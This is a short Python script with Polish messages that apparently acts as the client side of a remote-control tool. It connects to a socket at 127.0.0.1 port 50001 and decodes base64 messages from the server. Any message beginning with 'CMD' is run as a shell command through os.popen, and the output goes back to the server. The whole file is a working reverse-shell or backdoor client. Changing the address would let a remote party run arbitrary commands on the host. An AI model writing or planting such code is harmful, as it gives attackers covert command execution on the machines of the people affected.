import socket
import base64
import os

new_socket = socket.socket()
new_socket.connect(("127.0.0.1", 50001))
print("connection established....")

while True:
    fromServer = base64.b64decode(new_socket.recv(2048).decode()).decode("UTF-8")

    if fromServer.strip().upper() == "EXIT":
        print("server przerwal polaczenie")
        new_socket.close()
        break
    elif fromServer[:3].upper() == "CMD":
        rezultat = os.popen(fromServer[4:]).read()
        new_socket.send(base64.b64encode(rezultat.encode()))

    else:
        print(fromServer)

    toServer = input("widomosc do Serwera:")
    new_socket.send(base64.b64encode(toServer.encode()))
    if toServer.strip().upper() == "EXIT":
        new_socket.close()
        print("koncze program")
        break




new_socket.close()